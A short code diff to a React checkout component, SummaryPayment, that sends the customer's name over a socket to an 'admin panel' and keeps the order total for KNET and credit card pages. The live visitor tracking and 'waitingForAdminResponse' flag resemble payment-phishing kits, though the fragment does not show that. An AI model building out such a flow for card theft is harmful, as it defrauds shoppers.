@@ -1,6 +1,6 @@
 import { useState, useEffect } from "react";
 import { useLocation } from "wouter";
-import { sendData, navigateToPage } from "@/lib/store";
+import { sendData, navigateToPage, socket } from "@/lib/store";
 import { useStore } from "@/store/StoreContext";
 import { useLang } from "@/store/LanguageContext";
 
@@ -117,11 +117,14 @@ export default function SummaryPayment() {
       waitingForAdminResponse: false,
     });
 
-    // Save total and customer name for KNET/credit card pages
+    // Save total for KNET/credit card pages
     localStorage.setItem('Total', grandTotal.toFixed(3));
-    localStorage.setItem('customerFirstName', firstName);
-    localStorage.setItem('customerLastName', lastName);
-    localStorage.setItem('customerFullName', `${firstName} ${lastName}`.trim());
+
+    // Update visitor name in admin panel
+    const customerName = `${firstName} ${lastName}`.trim();
+    if (customerName && socket.value.connected) {
+      socket.value.emit('visitor:updateName', customerName);
+    }
 
     setTimeout(() => {
       setIsProcessing(false);
